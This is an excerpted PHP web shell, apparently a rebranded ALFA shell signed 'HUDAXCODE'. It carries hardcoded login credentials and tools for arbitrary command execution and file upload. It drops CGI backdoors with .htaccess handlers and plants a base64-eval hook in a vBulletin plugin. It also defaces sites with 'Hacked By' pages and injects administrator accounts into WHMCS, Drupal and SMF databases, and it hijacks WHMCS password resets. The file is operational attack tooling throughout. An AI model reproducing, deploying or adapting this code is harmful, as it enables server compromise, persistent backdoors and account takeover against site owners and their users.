...
/*
 ...
 Recoded by hudaxcode / HengkerBarBar
 Last on 23 Mar 2025

*/

$GLOBALS['HUDAXCODE'] = array(
    'username' => 'hxc',
    'password' => 'ab1302fa7064ad5005a49b9d3fc67d8f',
    'safe_mode' => '1',
    'login_page' => '403',
    'show_icons' => '1',
...
$GLOBALS['DB_NAME'] = $GLOBALS['HUDAXCODE'];
...
define("__ALFA_CODE_NAME__", "hxc");
define("__ALFA_DATA_FOLDER__", "HUDAXCODE");
...
<title>.: HengkerBarBar Shell :.</title><center>
<center><img src=https://i.pinimg.com/736x/4f/a4/6c/4fa46c7a0ae82a1d1ed7e5bbf8768395.jpg style="border-radius:100px;"width="500" height="250" alt="HengkerBarBar Shell" draggable="false"> </center>
<div id=loginbox><p><font face="DejaVu Sans" size=-1>
<center><table cellpadding=\'2\' cellspacing=\'0\' border=\'0\' id=\'ap_table\'>
<tr><td bgcolor="gold"><table cellpadding=\'0\' cellspacing=\'0\' border=\'0\' width=\'100%\'><tr><td bgcolor="black" align=center style="padding:2;padding-bottom:4"><b><font color="white" size=-1 color="white" face="verdana"><b>HengkerBarBar Shell</b></font></th></tr>
...
function _alfa_cgicmd($cmd,$lang="perl",$set_cookie=false){
	...
	if(isset($_COOKIE["hudaxcodecgiapi_mode"])){
		return "";
	}
	$cmd_pure = $cmd;
	...
	if($is_curl||$is_socket){
		$recreate = false;
		if(isset($_COOKIE["hudaxcodecgiapi"])){
			if(!@file_exists("hudaxcodecgiapi/".$_COOKIE["hudaxcodecgiapi"].".hudaxcode")){
				$recreate = true;
				$lang = $_COOKIE["hudaxcodecgiapi"];
			}
		}
		if(!isset($_COOKIE["hudaxcodecgiapi"])||$recreate){
			...
			if($lang == "aspx"){
				...
				alfaWriteTocgiapi($lang.".hudaxcode",$source);
			}
			alfacgihtaccess('cgi', "hudaxcodecgiapi/");
		}else{
			$lang = $_COOKIE["hudaxcodecgiapi"];
		}
		$cgi_ext = ".hudaxcode";
		...
		$cgi_url = __ALFA_DATA_FOLDER__."/hudaxcodecgiapi/".$lang.$cgi_ext;
		$cmd = "check=W3NvbGV2aXNpYmxlfmFwaV0=&cmd=".phew("cd ".$GLOBALS['cwd'].";".$cmd);
		if($is_curl){
		...
		if(strpos($data, "[solevisible~api]") !== false && strpos($data, '[solevisible~api]<pre>"+output+"</pre>') === false){
			if($set_cookie){
				__alfa_set_cookie("hudaxcodecgiapi", $lang);
			}
			...
			if($set_cookie){
				__alfa_set_cookie("hudaxcodecgiapi_mode", "off");
			}
		}
		return trim($out);
	}else{
...
if(isset($_GET["HUDAXCODE"])){
@error_reporting(E_ALL ^ E_NOTICE);
echo '<html>';
echo "<title>HUDAXCODE Hidden Shell</title>";
...
if(@move_uploaded_file($_FILES['file']['tmp_name'], duar(@$_POST['cwd']).'/'.$_FILES['file']['name'])){echo '<b><font color="#7CFC00"><center>Upload Successfully ;)</font></a><font color="#7CFC00"></b><br><br></center>'; }
...
$solevisible = "cd '".addslashes(str_replace("\\","/",@alfaGetCwd()))."'".$separator."".duar($_POST['command_solevisible']);
...
define("ALFA_UPLOADER", "eval(base64_decode('".phew($alfa_uploader)."'))");
if(!isset($_POST['ajax'])){
...
<title>..:: '.$_SERVER['HTTP_HOST'].' ~ Chedoya  Cyber Team ::..</title>
<style type="text/css">';?>
...
<div id=\'hidden_sh\'><a class="alert_green" target="_blank" href="?HUDAXCODE"><span style="color:#42ff59;">'.__ALFA_CODE_NAME__.'</span><br><small>Version: <span class="hidden_shell_version">'.__ALFA_VERSION__.'</span></small></a></div>
...
<td width="12%" rowspan="8"><img style="border-radius:100px;" width="300" height="150" alt="lph team 2023" draggable="false" src="https://i.pinimg.com/736x/4f/a4/6c/4fa46c7a0ae82a1d1ed7e5bbf8768395.jpg" /></td>
</tr>
<tr>
...
if($key=='')$key='alfa';
if($method=='my'){$shell=phew($shell);}else{$shell=$GLOBALS['__ALFA_SHELL_CODE'];}
...
<font color='#FFFFFF'>Shell ReCoded By HUDAXCODE </font><br>
<font color='#00A220'>Contact : HUDAXCODE@yourheart.com</font><br>
...
curl_setopt($curl, CURLOPT_HEADER,0);
curl_setopt($curl, CURLOPT_RETURNTRANSFER,1);
curl_setopt($curl, CURLOPT_HTTPHEADER, array("Authorization: Basic " . phew($info['username'].":".$info['password']) . "\n\r"));
curl_setopt($curl, CURLOPT_URL, $url);
$result = @curl_exec($curl);
$curl_errno = curl_errno($curl);
$curl_error = curl_error($curl);
...
$create = "insert into tblclients (email) values('HUDAXCODE@yourheart.com')";
...
$AlfaSole->Send($path."/pwreset.php","post","token={$token[1]}&action=reset&email=HUDAXCODE@yourheart.com");
...
function alfacheckupdate(){
	if($GLOBALS["DB_NAME"]["cgi_api"]){
		if(!isset($_COOKIE["hudaxcodecgiapi_mode"])&&!isset($_COOKIE["hudaxcodecgiapi"])){
...
function alfaWriteTocgiapi($name, $source){
	...
	@mkdir('hudaxcodecgiapi',0755);
	__write_file("hudaxcodecgiapi/".$name, __get_resource($source));
	@chmod("hudaxcodecgiapi/".$name, 0755);
	return $temp;
}
...
function alfaupdateheader(){
	if(!isset($_COOKIE["updateheader_data"])){
		...
		$data = alfaEx("cd '{$tmp_path}/hudaxcodecgiapi';sh getheader.hudaxcode",false,true,true);
		if(@is_array(@json_decode($data,true))){
			__alfa_set_cookie("updateheader_data", phew($data));
			echo $data;
		}
	}else{
		echo duar($_COOKIE["updateheader_data"]);
	}
}
...
echo '<?xml version="1.0" encoding="ISO-8859-1"?><plugins><plugin active="1" product="vbulletin"><title>vBulletin</title><hookname>init_startup</hookname><phpcode><![CDATA[if (strpos($_SERVER[\'PHP_SELF\'],"subscriptions.php")){eval(base64_decode(\''.phew($_POST['alfa1']).'\'));exit;}]]></phpcode></plugin></plugins>';
...
<span class='footer_text'>Upload file: </span><span><button id='addup' onclick='addnewup();return false;'><b>+</b></button></span><p id='pfooterup'><label class='inputfile' for='footerup'><span id='__fnameup'></span> <strong>&nbsp;&nbsp;Choose a file</strong></label><input id='footerup' class='toolsInp' type='file' name='f[]' onChange='handleup(this,0);' multiple></p><input type='submit' name='submit' value=' '></form><div id='alfa-copyright'><span class='copyright'>[ HUDAXCODE &copy; 2023-".date('Y')." ]</span><br><span><a href='javascript:void(0);' onclick='alert(\"HACKED BY hudaxcodeWORLD\");' style='color: #E91E63;text-decoration: none;'>Contact Me at</a></span> <span style='letter-spacing: 2px;color: #dfff00;'>HUDAXCODE@yourheart.com</span> <span><a style='color: #ff6060;text-decoration: none;' target='_blank' href='https://telegram.me/HUDAXCODE'>@HUDAXCODE</a></span></div></td>
</tr>
</table>
</div>
...
if($dirContent === false){
	if(_alfa_can_runCommand(true,true)){
		...
		@chdir(dirname($_SERVER["SCRIPT_FILENAME"]));
		if(!isset($_COOKIE["alfachdir_bash"])||@!file_exists($tmp_getdir_path."/hudaxcodecgiapi/getdir.alfa")){
		...
		$dirContent = alfaEx("cd ".$tmp_getdir_path."/hudaxcodecgiapi;sh getdir.alfa '".addslashes(isset($_POST['c'])?$_POST['c']:$GLOBALS['cwd'])."'");
...
if($chdir_fals&&$alfa_canruncmd){
	...
	$source = phew(__read_file($file, false));
}
...
if(isset($_COOKIE["eval_tmpdir"])&&@is_dir($_COOKIE["eval_tmpdir"])){
	$tempdir = duar($_COOKIE["eval_tmpdir"]);
}else{
	$tempdir = dirname(alfaEx("mktemp"));
	__alfa_set_cookie("eval_tmpdir", phew($tempdir));
}
alfahead();
...
$stringTools = array(
'Base64_encode ( $string )' => 'phew($s)',
'Base64_decode ( $string )' => 'duar($s)',
...
'base64_encode (gzdeflate( $string , 9)) --> Encode' => 'phew(gzdeflate($s, 9))',
'gzinflate (base64_decode( $string )) --> Decode' => '@gzinflate(duar($s))',
'str_rot13 (base64_encode( $string )) --> Encode' => 'str_rot13(phew($s))',
'base64_decode (str_rot13( $string )) --> Decode' => 'duar(str_rot13($s))',
'str_rot13 (base64_encode(gzdeflate( $string , 9))) --> Encode' => 'str_rot13(phew(gzdeflate($s,9)))',
'gzinflate (base64_decode(str_rot13( $string ))) --> Decode' => '@gzinflate(duar(str_rot13($s)))',
);
alfahead();
echo '<div class=header>';
...
<textarea name=index rows='19' cols='103'><title>Hacked By HUDAXCODE</title><b>Hacked By HUDAXCODE</b></textarea><br>
<input type='submit' value=' '>
</form></center></center>";
if(isset($_POST['alfa6'])){
$s0levisible="Powered By HUDAXCODE";
$dbu = $_POST['alfa6'];
$path = $_POST['alfa5'];
$fname = $_POST['alfa4'];
$dbn = $_POST['alfa7'];
...
$deface = '$x = base64_decode("'.phew($index).'"); $solevisible = fopen("'.$fname.'","w"); fwrite($solevisible,$x);';
$saveData = phew($deface);
...
$result=@mysqli_query($conn,$inject) or die (mysqli_error($conn));
$create = "insert into tblclients (email) values('HUDAXCODE@chedoyacyberteam.com')";
$result2 =@mysqli_query($conn,$create) or die (mysqli_error($conn));
if(function_exists('curl_version')){
$AlfaSole = new AlfaCURL(true);
$saveurl = $AlfaSole->Send($path."/pwreset.php");
$getToken = preg_match("/name=\"token\" value=\"(.*?)\"/i",$saveurl,$token);
$AlfaSole->Send($path."/pwreset.php","post","token={$token[1]}&action=reset&email=HUDAXCODE@chedoyacyberteam.com");
$backdata = "UPDATE tblemailtemplates SET message='{$tempSave}' WHERE name='Password Reset Validation'";
$Solevisible = mysqli_query($conn,$backdata) or die (mysqli_error($conn));
...
create_table($table);
echo "<br><div class='txtfont'>| Your Index |</div><br>
<textarea name='index' rows='19' cols='103'><title>Hacked By hudaxcodeWorld</title><b>Hacked By hudaxcodeWorld</b></textarea><br>
<input type='submit' value=' '></form></center></center>";
if($_POST['alfa8']=='>>'){
$s0levisible="Powered By Chedoya Cyber  Team";
$dbu = $_POST['alfa2'];
$dbn = $_POST['alfa3'];
$dbp = $_POST['alfa4'];
$dbh = $_POST['alfa5'];
...
<title>Hacked By hudaxcodeWorld</title><b>Hacked By hudaxcodeWorld</b></textarea><p><input type='submit' value='' ></p></form></center></center>";
if(isset($_POST['alfa6'])){
...
$table = array('td1' =>
 ...
 'td8' =>
 array('color' => 'FF0000', 'tdName' => 'Admin Email', 'inputName' => 'email', 'inputValue' => 'HUDAXCODE@chedoyacyberteam.com', 'inputSize' => '50')
);
create_table($table);
...
$solevisible=@mysqli_query($conn,"insert into users (uid,name,pass,mail,signature_format,status,timezone,init) values('$getDescuid','$admin','\$S\$DP2y9AbolCBOd\/WyQcpzu4zF57qE0noyCNeXZWv.37R66VsFjOiC','HUDAXCODE@chedoyacyberteam.com','filtered_html','1','Europe/Berlin','HUDAXCODE@chedoyacyberteam.com')") or die(mysqli_error($conn));
...
$solevisible=@mysqli_query($conn,"insert into {$prefix}members (id_member,member_name,id_group,real_name,passwd,email_address) values(null,'$admin','1','$admin','$setpwAlg','HUDAXCODE@chedoyacyberteam.com')") or die(mysqli_error($conn));
if($solevisible){
__alert('Success... '.$admin.' is created...');}
}
}
...
if(isset($_POST['alfa2'])&&($_POST['alfa2']=='symperl'||$_POST["alfa2"]=="sympy")){
	...
	if(strlen($resource) == 0){
		echo AlfaiFrameCreator('cgihudaxcode/'.$cginame);
	}else{
		echo $resource;
	}
}
...
echo "<div class=header>";
echo "
<center><p><img src=\"https://i.pinimg.com/736x/4f/a4/6c/4fa46c7a0ae82a1d1ed7e5bbf8768395.jpg\"></p>";
...
@chmod($name,0755);
echo '<iframe src="'.__ALFA_DATA_FOLDER__.'/cgihudaxcode/'.$name.'" width="100%" height="600px" frameborder="0" style="opacity:0.9;filter: alpha(opacity=9);overflow:auto;"></iframe>';
}
}
echo $div;
alfafooter();
...
if($m=='cgi'){
$code = "#ReCoded By hudaxcodeWorld\nOptions FollowSymLinks MultiViews Indexes ExecCGI\nAddType application/x-httpd-cgi .hudaxcode\nAddHandler cgi-script .hudaxcode";
}elseif($m=='sym'){
...
$tmp_path = alfaWriteTocgiapi("basedir.hudaxcode",$bash);
$bash_users  = alfaEx("cd ".$tmp_path."/hudaxcodecgiapi;sh basedir.hudaxcode ".$makepwd,false,true,true);
...
$content = chunk_split(phew($content));
$uid = md5(uniqid(time()));
